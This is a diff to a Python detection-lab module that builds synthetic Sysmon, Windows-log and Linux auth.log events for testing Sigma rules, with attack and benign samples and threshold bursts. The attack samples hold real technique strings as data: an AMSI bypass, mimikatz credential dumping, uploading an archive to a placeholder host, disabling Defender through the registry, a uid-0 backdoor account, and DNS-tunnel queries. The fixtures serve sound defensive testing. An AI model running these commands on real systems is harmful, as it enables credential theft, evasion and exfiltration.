@@ -1,7 +1,7 @@
 """Sample telemetry for every Sigma rule: events that must fire and events that must not.
 
 The events are synthetic. They are shaped like the ECS documents that Elastic
-Agent produces for Sysmon and for Linux process auditing, and they carry the
+Agent produces for Sysmon and for Linux process auditing. They carry the
 command lines of real techniques. Nothing here was captured from a real host.
 
 Each rule has "attack" events (one for every branch of its logic) and "benign"
@@ -14,9 +14,12 @@ import json
 from datetime import datetime, timedelta, timezone
 from typing import Any
 
+from detlab import authlog
+
 START = datetime(2026, 11, 10, 9, 0, 0, tzinfo=timezone.utc)
 
 SYSMON = "Microsoft-Windows-Sysmon"
+SYSMON_CHANNEL = "Microsoft-Windows-Sysmon/Operational"
 SYSTEM32 = "C:\\Windows\\System32\\"
 POWERSHELL = SYSTEM32 + "WindowsPowerShell\\v1.0\\powershell.exe"
 EXPLORER = "C:\\Windows\\explorer.exe"
@@ -46,6 +49,7 @@ def win_process(image: str, command_line: str, parent: str = EXPLORER, parent_co
         "event": {"code": "1", "provider": SYSMON, "category": "process", "type": "start", "kind": "event",
                   "dataset": "windows.sysmon_operational", "action": "Process Create (rule: ProcessCreate)"},
         "host": {"name": host, "os": {"type": "windows"}},
+        "winlog": {"channel": SYSMON_CHANNEL},
         "user": {"name": user, "domain": "LAB"},
         "process": {
             "executable": image, "name": file_name, "command_line": command_line,
@@ -64,7 +68,7 @@ def win_process_access(source: str, target: str, access: str, host: str = "WS-FI
                   "dataset": "windows.sysmon_operational", "action": "Process accessed (rule: ProcessAccess)"},
         "host": {"name": host, "os": {"type": "windows"}},
         "process": {"executable": source, "name": _name(source)},
-        "winlog": {"event_data": {"TargetImage": target, "GrantedAccess": access}},
+        "winlog": {"channel": SYSMON_CHANNEL, "event_data": {"TargetImage": target, "GrantedAccess": access}},
     }
 
 
@@ -74,6 +78,7 @@ def win_registry_set(image: str, key: str, value: str, host: str = "WS-FIN-07") 
         "event": {"code": "13", "provider": SYSMON, "category": "registry", "type": "change", "kind": "event",
                   "dataset": "windows.sysmon_operational", "action": "Registry value set (rule: RegistryEvent)"},
         "host": {"name": host, "os": {"type": "windows"}},
+        "winlog": {"channel": SYSMON_CHANNEL},
         "process": {"executable": image, "name": _name(image)},
         "registry": {"path": key, "data": {"strings": value}},
     }
@@ -85,6 +90,7 @@ def win_file_create(image: str, path: str, host: str = "WS-FIN-07") -> dict[str,
         "event": {"code": "11", "provider": SYSMON, "category": "file", "type": "creation", "kind": "event",
                   "dataset": "windows.sysmon_operational", "action": "File created (rule: FileCreate)"},
         "host": {"name": host, "os": {"type": "windows"}},
+        "winlog": {"channel": SYSMON_CHANNEL},
         "process": {"executable": image, "name": _name(image)},
         "file": {"path": path, "name": _name(path)},
     }
@@ -96,9 +102,61 @@ def win_dns_query(image: str, name: str, host: str = "WS-FIN-07") -> dict[str, A
         "event": {"code": "22", "provider": SYSMON, "category": "network", "type": "protocol", "kind": "event",
                   "dataset": "windows.sysmon_operational", "action": "Dns query (rule: DnsQuery)"},
         "host": {"name": host, "os": {"type": "windows"}},
+        "winlog": {"channel": SYSMON_CHANNEL},
         "process": {"executable": image, "name": _name(image)},
         "dns": {"question": {"name": name}},
     }
+
+
+def win_network(image: str, ip: str, port: int, domain: str = "", host: str = "WS-FIN-07") -> dict[str, Any]:
+    """Sysmon event 3: network connection."""
+    return {
+        "event": {"code": "3", "provider": SYSMON, "category": "network", "type": "connection", "kind": "event",
+                  "dataset": "windows.sysmon_operational",
+                  "action": "Network connection detected (rule: NetworkConnect)"},
+        "host": {"name": host, "os": {"type": "windows"}},
+        "winlog": {"channel": SYSMON_CHANNEL, "event_data": {"Protocol": "tcp", "Initiated": "true"}},
+        "process": {"executable": image, "name": _name(image)},
+        "destination": {"ip": ip, "port": str(port), "domain": domain},
+    }
+
+
+def win_sysmon(code: int, action: str, category: str, image: str = "", path: str = "",
+               host: str = "WS-FIN-07", **data: str) -> dict[str, Any]:
+    """Any other Sysmon event: 2 (file creation time), 8 (remote thread), 19 to 21 (WMI)."""
+    event: dict[str, Any] = {
+        "event": {"code": str(code), "provider": SYSMON, "category": category, "kind": "event",
+                  "dataset": "windows.sysmon_operational", "action": action},
+        "host": {"name": host, "os": {"type": "windows"}},
+        "winlog": {"channel": SYSMON_CHANNEL, "event_data": dict(data)},
+    }
+    if image:
+        event["process"] = {"executable": image, "name": _name(image)}
+    if path:
+        event["file"] = {"path": path, "name": _name(path)}
+    return event
+
+
+def win_log(channel: str, provider: str, code: int, action: str, host: str = "WS-FIN-07",
+            **data: str) -> dict[str, Any]:
+    """An event from the Security or System log. Its fields sit under winlog.event_data, as Winlogbeat stores them."""
+    return {
+        "event": {"code": str(code), "provider": provider, "kind": "event", "action": action,
+                  "dataset": f"windows.{channel.lower()}"},
+        "host": {"name": host, "os": {"type": "windows"}},
+        "winlog": {"channel": channel, "event_data": dict(data)},
+    }
+
+
+def security(code: int, action: str, **data: str) -> dict[str, Any]:
+    return win_log("Security", "Microsoft-Windows-Security-Auditing", code, action, **data)
+
+
+def service_installed(name: str, image_path: str, host: str = "SRV-APP-02") -> dict[str, Any]:
+    """System event 7045: a service was installed."""
+    return win_log("System", "Service Control Manager", 7045, "A service was installed in the system", host=host,
+                   ServiceName=name, ImagePath=image_path, ServiceType="user mode service",
+                   StartType="auto start", AccountName="LocalSystem")
 
 
 def linux_process(executable: str, command_line: str, parent: str = "/usr/bin/bash", user: str = "deploy",
@@ -340,6 +398,244 @@ CASES: dict[str, tuple[list[dict[str, Any]], list[dict[str, Any]]]] = {
     ),
 }
 
+# Rules that came out of running the attack simulator's scenarios against the lab.
+TEMP = "C:\\Users\\jdoe\\AppData\\Local\\Temp\\"
+DEFENDER_KEY = "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\"
+AMSI_BYPASS = ("powershell.exe -c \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
+               ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\"")
+CASES.update({
+    "win_masquerading_system_binary_wrong_path": (
+        [win_process(TEMP + "svchost.exe", TEMP + "svchost.exe", parent=POWERSHELL),
+         win_process("C:\\ProgramData\\lsass.exe", "lsass.exe", parent=CMD)],
+        [win_process(SYSTEM32 + "services.exe", "C:\\Windows\\System32\\services.exe",
+                     parent=SYSTEM32 + "wininit.exe", user="SYSTEM"),
+         win_process("C:\\Windows\\SysWOW64\\svchost.exe", "svchost.exe -k netsvcs", parent=SYSTEM32 + "services.exe",
+                     user="SYSTEM")],
+    ),
+    "win_reg_add_run_key": (
+        [win_process(SYSTEM32 + "reg.exe",
+                     "reg.exe add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" "
+                     "/v Updater /t REG_SZ /d \"C:\\Users\\Public\\updater.exe\" /f", parent=CMD)],
+        [win_process(SYSTEM32 + "reg.exe", "reg.exe query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\""),
+         win_process(SYSTEM32 + "reg.exe", "reg.exe add \"HKCU\\Software\\Vendor\\App\" /v Theme /d dark /f")],
+    ),
+    "win_archive_password_protected": (
+        [win_process("C:\\Program Files\\7-Zip\\7z.exe", "7z.exe a -pS3cret C:\\Temp\\data.7z C:\\Shares\\Finance\\*",
+                     parent=CMD, original="7z.exe"),
+         win_process("C:\\Program Files\\WinRAR\\rar.exe", "rar.exe a -hpS3cret C:\\Temp\\d.rar C:\\Shares\\HR",
+                     parent=CMD, original="rar.exe")],
+        [win_process("C:\\Program Files\\7-Zip\\7z.exe", "7z.exe a C:\\Backup\\logs.7z C:\\Logs\\*.log",
+                     original="7z.exe"),
+         win_process("C:\\Program Files\\7-Zip\\7z.exe", "7z.exe x -pS3cret C:\\Downloads\\archive.7z",
+                     original="7z.exe")],
+    ),
+    "win_powershell_http_upload": (
+        [win_process(POWERSHELL, "powershell.exe -c \"Invoke-WebRequest -Uri https://files.example.org/u "
+                                 "-Method POST -InFile C:\\Temp\\data.7z\"", parent=CMD),
+         win_process("C:\\Program Files\\PowerShell\\7\\pwsh.exe", "pwsh.exe -Command \"Invoke-RestMethod -Uri "
+                     "https://files.example.org/u -Method PUT -InFile C:\\Temp\\d.zip\"", parent=CMD)],
+        [win_process(POWERSHELL, "powershell.exe -Command \"Invoke-RestMethod -Uri https://api.example.com/status "
+                                 "-Method GET\""),
+         win_process(POWERSHELL, "powershell.exe -Command \"Invoke-RestMethod -Uri https://api.example.com/jobs "
+                                 "-Method POST -Body '{}'\"")],
+    ),
+    "win_powershell_amsi_bypass": (
+        [win_process(POWERSHELL, AMSI_BYPASS, parent=CMD)],
+        [win_process(POWERSHELL, "powershell.exe -Command \"Get-MpComputerStatus | Select-Object AMServiceEnabled\"")],
+    ),
+    "win_mimikatz_command_line": (
+        [win_process("C:\\Users\\Public\\mimikatz.exe", "mimikatz.exe \"privilege::debug\" "
+                     "\"sekurlsa::logonpasswords\" exit", parent=CMD, original="mimikatz.exe"),
+         win_process("C:\\Users\\Public\\m.exe", "m.exe \"lsadump::sam\" exit", parent=CMD, original="m.exe"),
+         win_process("C:\\Users\\Public\\notes.exe", "notes.exe", parent=CMD, original="mimikatz.exe")],
+        [win_process(SYSTEM32 + "notepad.exe", "notepad.exe C:\\Users\\jdoe\\Documents\\mimikatz-report.txt")],
+    ),
+    "win_suspicious_process_outbound_connection": (
+        [win_network(POWERSHELL, "203.0.113.10", 443, "update-service.example.com"),
+         win_network(TEMP + "updater.exe", "198.51.100.25", 443, "cdn-update.example.net")],
+        [win_network(POWERSHELL, "10.10.20.80", 443, "intranet.lab-example.com"),
+         win_network("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "203.0.113.10", 443,
+                     "www.example.com")],
+    ),
+    "win_remote_admin_port_from_shell": (
+        [win_network(CMD, "10.10.20.50", 445), win_network(SYSTEM32 + "wbem\\WMIC.exe", "10.10.20.51", 135),
+         win_network(POWERSHELL, "10.10.20.52", 5985)],
+        [win_network(SYSTEM32 + "svchost.exe", "10.10.20.50", 445), win_network(CMD, "10.10.20.80", 80)],
+    ),
+    "win_script_host_drops_executable": (
+        [win_file_create(POWERSHELL, TEMP + "update.exe"), win_file_create(WINWORD, "C:\\Users\\Public\\helper.dll")],
+        [win_file_create(POWERSHELL, "C:\\Users\\jdoe\\Documents\\report.csv"),
+         win_file_create(SYSTEM32 + "msiexec.exe", "C:\\ProgramData\\Vendor\\agent.exe")],
+    ),
+    "win_file_creation_time_changed": (
+        [win_sysmon(2, "File creation time changed (rule: FileCreateTime)", "file", image="C:\\Temp\\timestomp.exe",
+                    path="C:\\ProgramData\\update.exe", CreationUtcTime="2019-01-01 00:00:00.000",
+                    PreviousCreationUtcTime="2026-11-10 09:30:00.000")],
+        [win_sysmon(2, "File creation time changed (rule: FileCreateTime)", "file",
+                    image="C:\\Program Files\\7-Zip\\7z.exe", path="C:\\Users\\jdoe\\Documents\\old.txt",
+                    CreationUtcTime="2024-03-01 10:00:00.000", PreviousCreationUtcTime="2026-11-10 09:30:00.000"),
+         win_sysmon(2, "File creation time changed (rule: FileCreateTime)", "file", image=EXPLORER,
+                    path="C:\\Users\\jdoe\\Pictures\\scan.png", CreationUtcTime="2025-01-01 10:00:00.000",
+                    PreviousCreationUtcTime="2026-11-10 09:30:00.000")],
+    ),
+    "win_remote_thread_from_user_folder": (
+        [win_sysmon(8, "CreateRemoteThread detected (rule: CreateRemoteThread)", "process",
+                    image="C:\\Temp\\loader.exe", TargetImage=SYSTEM32 + "svchost.exe", StartAddress="0x7FFE0000"),
+         win_sysmon(8, "CreateRemoteThread detected (rule: CreateRemoteThread)", "process",
+                    image="C:\\Users\\jdoe\\AppData\\Roaming\\inj.exe", TargetImage=EXPLORER,
+                    StartAddress="0x00007FF6A0000000")],
+        [win_sysmon(8, "CreateRemoteThread detected (rule: CreateRemoteThread)", "process",
+                    image=SYSTEM32 + "csrss.exe", TargetImage=SYSTEM32 + "conhost.exe", StartAddress="0x7FFA0000")],
+    ),
+    "win_wmi_event_subscription": (
+        [win_sysmon(19, "WmiEventFilter activity detected (rule: WmiEvent)", "configuration", Operation="Created",
+                    EventNamespace="root\\subscription", Name="SystemHealthCheck"),
+         win_sysmon(20, "WmiEventConsumer activity detected (rule: WmiEvent)", "configuration", Operation="Created",
+                    Name="SystemHealthCheck", Type="Command Line", Destination="C:\\ProgramData\\update.exe"),
+         win_sysmon(21, "WmiEventConsumerToFilter activity detected (rule: WmiEvent)", "configuration",
+                    Operation="Created", Consumer="SystemHealthCheck", Filter="SystemHealthCheck")],
+        [win_sysmon(19, "WmiEventFilter activity detected (rule: WmiEvent)", "configuration", Operation="Deleted",
+                    EventNamespace="root\\subscription", Name="OldInventoryFilter")],
+    ),
+    "win_defender_disabled_registry": (
+        [win_registry_set(POWERSHELL, DEFENDER_KEY + "DisableAntiSpyware", "DWORD (0x00000001)"),
+         win_registry_set(SYSTEM32 + "reg.exe", DEFENDER_KEY + "Real-Time Protection\\DisableRealtimeMonitoring",
+                          "DWORD (0x00000001)")],
+        [win_registry_set(SYSTEM32 + "svchost.exe", DEFENDER_KEY + "DisableAntiSpyware", "DWORD (0x00000000)"),
+         win_registry_set(SYSTEM32 + "svchost.exe", DEFENDER_KEY + "Signature Updates\\ForceUpdateFromMU",
+                          "DWORD (0x00000001)")],
+    ),
+    "win_security_log_cleared": (
+        [win_log("Security", "Microsoft-Windows-Eventlog", 1102, "The audit log was cleared",
+                 SubjectUserName="administrator", SubjectDomainName="LAB")],
+        [win_log("Security", "Microsoft-Windows-Eventlog", 1100, "The event logging service has shut down")],
+    ),
+    "win_scheduled_task_created_suspicious_command": (
+        [security(4698, "A scheduled task was created", SubjectUserName="administrator",
+                  TaskName="\\Microsoft\\Windows\\Maintenance\\SystemUpdate",
+                  TaskContent="<Exec><Command>C:\\ProgramData\\update.exe</Command></Exec>"),
+         security(4698, "A scheduled task was created", SubjectUserName="jdoe", TaskName="\\Updater",
+                  TaskContent="<Exec><Command>powershell.exe</Command><Arguments>-w hidden -File "
+                              "C:\\Users\\Public\\s.ps1</Arguments></Exec>")],
+        [security(4698, "A scheduled task was created", SubjectUserName="administrator", TaskName="\\Nightly Backup",
+                  TaskContent="<Exec><Command>C:\\Program Files\\Backup\\backup.exe</Command></Exec>"),
+         security(4699, "A scheduled task was deleted", SubjectUserName="administrator", TaskName="\\Updater",
+                  TaskContent="<Exec><Command>C:\\ProgramData\\update.exe</Command></Exec>")],
+    ),
+    "win_sedebug_privilege_assigned": (
+        [security(4672, "Special privileges assigned to new logon", SubjectUserName="administrator",
+                  SubjectDomainName="LAB", PrivilegeList="SeDebugPrivilege, SeBackupPrivilege, SeRestorePrivilege")],
+        [security(4672, "Special privileges assigned to new logon", SubjectUserName="SYSTEM",
+                  SubjectDomainName="NT AUTHORITY", PrivilegeList="SeDebugPrivilege, SeTcbPrivilege"),
+         security(4672, "Special privileges assigned to new logon", SubjectUserName="WS-FIN-07$",
+                  SubjectDomainName="LAB", PrivilegeList="SeDebugPrivilege, SeImpersonatePrivilege"),
+         security(4672, "Special privileges assigned to new logon", SubjectUserName="jdoe", SubjectDomainName="LAB",
+                  PrivilegeList="SeChangeNotifyPrivilege, SeIncreaseWorkingSetPrivilege")],
+    ),
+    "win_service_installed_suspicious_path": (
+        [service_installed("WindowsSystemHealth", "C:\\ProgramData\\healthsvc.exe"),
+         service_installed("UpdaterSvc", "%COMSPEC% /c powershell -nop -w hidden -File C:\\Windows\\Tasks\\u.ps1")],
+        [service_installed("AcmeAgent", "\"C:\\Program Files\\Acme\\agent.exe\""),
+         service_installed("WinDefend", "\"C:\\Program Files\\Windows Defender\\MsMpEng.exe\"")],
+    ),
+    "win_service_installed_psexec": (
+        [service_installed("PSEXESVC", "%SystemRoot%\\PSEXESVC.exe"),
+         service_installed("RemoteAdm", "C:\\Windows\\PSEXESVC.exe")],
+        [service_installed("PsExecMonitor", "\"C:\\Program Files\\Monitoring\\psmon.exe\"")],
+    ),
+    "win_dns_query_long_encoded_label": (
+        [win_dns_query("C:\\Users\\Public\\updater.exe", "3b1612dd272d1371.data.evil-cdn.example.org"),
+         win_dns_query(POWERSHELL, "mfzwizlemfzwizlemfzwizle0a.t.example.net")],
+        [win_dns_query("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "accounts.example.com"),
+         win_dns_query("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+                       "d1234567890abcdef1234.cloudfront.net")],
+    ),
+})
+CASES["win_registry_run_key_suspicious_value"][0].append(
+    win_registry_set(SYSTEM32 + "reg.exe", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate",
+                     "C:\\ProgramData\\update.exe"))
+CASES["win_schtasks_create_suspicious_action"][0].append(
+    win_process(SYSTEM32 + "schtasks.exe", "schtasks.exe /create /tn \"SystemUpdate\" /tr "
+                "\"C:\\ProgramData\\update.exe\" /sc onlogon /ru SYSTEM", parent=CMD))
+CASES["win_service_create_user_writable_path"][0].append(
+    win_process(SYSTEM32 + "sc.exe", "sc.exe create WindowsSystemHealth binPath= \"C:\\ProgramData\\healthsvc.exe\" "
+                "start= auto", parent=CMD))
+
+CASES["win_psexec_service_child_process"][0].append(
+    win_process("C:\\Windows\\PSEXESVC.exe", "PSEXESVC.exe", parent=SYSTEM32 + "services.exe", user="SYSTEM",
+                host="SRV-APP-02", original="psexesvc.exe"))
+
+
+def auth_line(program: str, text: str, host: str = "web-01", pid: int | None = None) -> dict[str, Any]:
+    """One line of /var/log/auth.log as the stack's Logstash pipeline stores it (detlab/authlog.py)."""
+    tag = f"{program}[{pid}]" if pid else program
+    event = authlog.parse(f"Nov 10 09:00:00 {host} {tag}: {text}")
+    del event["@timestamp"]     # build() stamps every sample itself
+    return event
+
+
+def sudo(user: str, command: str) -> dict[str, Any]:
+    return auth_line("sudo", f"{user} : TTY=pts/1 ; PWD=/home/{user} ; USER=root ; COMMAND={command}")
+
+
+def ssh_failure(source: str, user: str, known: bool = True, method: str = "password") -> dict[str, Any]:
+    """sshd reports a failed login. For an account the host does not have, it says "invalid user"."""
+    account = user if known else f"invalid user {user}"
+    return auth_line("sshd", f"Failed {method} for {account} from {source} port 50022 ssh2", pid=4242)
+
+
+CASES["lnx_sudo_suspicious_command"] = (
+    [sudo("deploy", "/bin/bash"), sudo("deploy", "/usr/bin/cat /etc/shadow"),
+     sudo("deploy", "/usr/sbin/useradd -o -u 0 backdoor"), sudo("www-data", "/usr/bin/passwd root"),
+     sudo("deploy", "/bin/chmod 777 /tmp/exploit")],
+    [sudo("deploy", "/usr/bin/systemctl restart nginx"), sudo("deploy", "/usr/bin/cat /etc/passwd"),
+     sudo("deploy", "/usr/bin/ls /root"),
+     # A shell that sudo did not start: the same words in an sshd line
+     auth_line("sshd", "Accepted publickey for deploy from 10.10.20.15 port 50022 ssh2", pid=4242),
+     auth_line("sshd", "pam_unix(sshd:session): session opened for user deploy by (uid=0)", pid=4242),
+     auth_line("cron", "pam_unix(cron:session): session opened for user root by (uid=0)", pid=911)],
+)
+
+
+def failed_logon(source: str, account: str) -> dict[str, Any]:
+    return security(4625, "An account failed to log on", TargetUserName=account, IpAddress=source, LogonType="10",
+                    Status="0xC000006D", SubStatus="0xC000006A")
+
+
+def tunnel_query(host: str, number: int) -> dict[str, Any]:
+    label = f"{number:02x}" + "6c6162746573746461746131"[:22]
+    return win_dns_query("C:\\Users\\Public\\updater.exe", f"{label}.data.evil-cdn.example.org", host=host)
+
+
+# Threshold rules count events. Their samples are groups: a group that must raise the alert and groups
+# that must stay below it. rule key -> (alerting groups, quiet groups). A group is (group-by value, events).
+BURSTS: dict[str, tuple[list[tuple[str, list[dict[str, Any]]]], list[tuple[str, list[dict[str, Any]]]]]] = {
+    "win_failed_logon_burst": (
+        [("203.0.113.50", [failed_logon("203.0.113.50", account)
+                           for account in ["administrator", "admin", "root", "guest"] * 3])],
+        [("10.10.20.31", [failed_logon("10.10.20.31", "jdoe") for _ in range(4)]),
+         # Twelve failures, each from another address: no single source reaches the threshold.
+         ("10.10.21.x", [failed_logon(f"10.10.21.{last}", "svc_backup") for last in range(1, 13)])],
+    ),
+    "win_dns_tunnel_burst": (
+        [("WS-DEV-03", [tunnel_query("WS-DEV-03", number) for number in range(12)])],
+        [("WS-HR-02", [tunnel_query("WS-HR-02", number) for number in range(3)])],
+    ),
+    "lnx_ssh_failed_login_burst": (
+        [("203.0.113.77", [ssh_failure("203.0.113.77", user, known=user == "root")
+                           for user in ["root", "admin", "test", "oracle"] * 3])],
+        [("10.10.20.15", [ssh_failure("10.10.20.15", "deploy") for _ in range(3)]),
+         # Twelve password failures, each from another address: no single source reaches the threshold.
+         ("198.51.100.x", [ssh_failure(f"198.51.100.{last}", "admin", known=False) for last in range(1, 13)]),
+         # A client that offers twelve keys the server does not know. No password was tried.
+         ("10.10.20.16", [ssh_failure("10.10.20.16", "deploy", method="publickey") for _ in range(12)])],
+    ),
+}
+# Single-event rules that fire on every event of a threshold rule's groups.
+BURST_EVENTS_FIRE: dict[str, list[str]] = {
+    "win_dns_tunnel_burst": ["win_dns_query_long_encoded_label"],
+}
+
 # Ordinary activity that belongs to no rule and must match none.
 BACKGROUND: list[dict[str, Any]] = [
     win_process(SYSTEM32 + "svchost.exe", "C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
@@ -366,8 +662,8 @@ def build() -> tuple[list[dict[str, Any]], list[dict[str, Any]]]:
     benign: list[dict[str, Any]] = []
     clock = [START]
 
-    def stamp(event: dict[str, Any], event_id: str, case: str, rule: str) -> dict[str, Any]:
-        clock[0] += timedelta(seconds=37)
+    def stamp(event: dict[str, Any], event_id: str, case: str, rule: str, step: int = 37) -> dict[str, Any]:
+        clock[0] += timedelta(seconds=step)
         out = {"@timestamp": clock[0].strftime("%Y-%m-%dT%H:%M:%S.000Z")}
         out.update(json.loads(json.dumps(event)))     # deep copy
         out["event"]["id"] = event_id
@@ -381,11 +677,20 @@ def build() -> tuple[list[dict[str, Any]], list[dict[str, Any]]]:
             benign.append(stamp(event, f"{rule}-benign-{number}", "benign", rule))
     for number, event in enumerate(BACKGROUND, start=1):
         benign.append(stamp(event, f"background-{number}", "benign", "background"))
+    for rule, (alerting, quiet) in BURSTS.items():
+        for case, groups, target in (("burst", alerting, attack), ("quiet", quiet, benign)):
+            for group_number, (_value, events) in enumerate(groups, start=1):
+                for number, event in enumerate(events, start=1):
+                    # Events of a group follow each other closely, so the group fits the rule's time window.
+                    target.append(stamp(event, f"{rule}-{case}-{group_number}-{number:02d}", case, rule, step=5))
     return attack, benign
 
 
-# Events that fire a second rule on purpose: event ID -> the extra rule keys. None so far.
-ALSO_FIRES: dict[str, list[str]] = {}
+# Events that fire a second rule on purpose: event ID -> the extra rule keys.
+ALSO_FIRES: dict[str, list[str]] = {
+    # PowerShell renamed to svchost.exe in a user folder is also a system process name in the wrong place.
+    "win_renamed_powershell-attack-1": ["win_masquerading_system_binary_wrong_path"],
+}
 
 
 def expected(events: list[dict[str, Any]]) -> dict[str, list[str]]:
@@ -393,9 +698,27 @@ def expected(events: list[dict[str, Any]]) -> dict[str, list[str]]:
     out: dict[str, list[str]] = {}
     for event in events:
         event_id = event["event"]["id"]
-        own = [event["labels"]["lab_rule"]] if event["labels"]["lab_case"] == "attack" else []
+        case, rule = event["labels"]["lab_case"], event["labels"]["lab_rule"]
+        own = [rule] if case == "attack" else BURST_EVENTS_FIRE.get(rule, []) if case in ("burst", "quiet") else []
         out[event_id] = sorted(own + ALSO_FIRES.get(event_id, []))
     return out
+
+
+def expected_alerts() -> dict[str, list[tuple[str, ...]]]:
+    """Threshold rule key -> the groups that must raise it, compared without regard to case."""
+    return {rule: sorted((value.lower(),) for value, _events in alerting)
+            for rule, (alerting, _quiet) in BURSTS.items()}
+
+
+def alert_differences(wanted: dict[str, list[tuple[str, ...]]], actual: dict[str, list[tuple[str, ...]]]) -> list[str]:
+    """One line per threshold alert that is missing or was not expected."""
+    problems = []
+    for rule in sorted(set(wanted) | set(actual)):
+        want = {tuple(part.lower() for part in group) for group in wanted.get(rule, [])}
+        got = {tuple(part.lower() for part in group) for group in actual.get(rule, [])}
+        problems += [f"missed: {rule} raised no alert for {', '.join(group)}" for group in sorted(want - got)]
+        problems += [f"false positive: {rule} raised an alert for {', '.join(group)}" for group in sorted(got - want)]
+    return problems
 
 
 def differences(wanted: dict[str, list[str]], actual: dict[str, list[str]]) -> list[str]:
